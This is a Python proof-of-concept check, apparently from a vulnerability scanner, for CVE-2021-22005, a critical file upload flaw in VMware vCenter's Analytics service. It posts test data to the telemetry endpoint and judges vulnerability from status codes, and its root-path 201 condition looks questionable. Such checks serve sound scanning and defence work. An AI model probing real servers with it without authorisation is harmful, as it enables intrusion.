import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''VMware vCenter Server file upload vulnerability''',
        "description": '''The vCenter Server contains an arbitrary file upload vulnerability in the Analytics service. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.''',
        "severity": "critical",
        "references": [
            "https://kb.vmware.com/s/article/85717", 
            "https://www.vmware.com/security/advisories/VMSA-2021-0020.html", 
            "https://core.vmware.com/vmsa-2021-0020-questions-answers-faq"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-22005",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "vmware", "vcenter", "upload"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        headers = {}
        resp0 = requests.request(method=method,url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/analytics/telemetry/ph/api/hyper/send?_c&_i=test"""
        method = "POST"
        data = """test_data"""
        headers = {'Content-Type': 'application/json'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp0.status_code == 201 and resp1.status_code == 200 and "VMware vSphere" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url